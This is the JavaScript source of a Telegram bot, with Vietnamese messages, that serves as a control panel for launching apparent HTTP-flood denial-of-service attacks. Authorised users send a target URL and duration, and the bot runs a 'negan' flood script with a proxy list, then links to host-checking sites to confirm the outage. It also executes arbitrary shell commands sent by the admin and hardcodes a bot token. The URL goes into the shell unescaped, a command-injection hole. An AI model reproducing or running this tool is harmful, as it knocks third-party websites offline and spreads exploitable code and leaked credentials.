const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);

const bot = new TelegramBot(token, { polling: true });

bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');

bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;

    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền thực hiện lệnh này.', { parse_mode: 'HTML' });

    if (text.startsWith('http://') || text.startsWith('https://')) {
        const [host, time] = text.split(' ');
        if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });

        const pid = Math.floor(Math.random() * 10000);
        const startMessage = {
            status: "🚀Successfully🚀", pid, website: host, time: `${time} Giây`, caller: username, startTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
            checkHost: `Check Host (https://check-host.net/check-http?host=${host})`,
            hostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
        };
        await bot.sendMessage(chatId, JSON.stringify(startMessage, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
            [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }],
            [{ text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
        ]}});

        const child = exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
        child.on('close', () => {
            const completeMessage = { status: "✅Process completed✅", pid, website: host, time: `${time} Giây`, caller: username, endTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) };
            bot.sendMessage(chatId, JSON.stringify(completeMessage, null, 2), { parse_mode: 'HTML' });
        });
        return;
    }

    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống. Ví dụ: exe ls', { parse_mode: 'HTML' });
        exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
            bot.sendMessage(chatId, `🚀 Command result:\n<pre>${command}\n${stdout || stderr}</pre>`, { parse_mode: 'HTML' });
        });
        return;
    }

    bot.sendMessage(chatId, '🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.', { parse_mode: 'HTML' });
});
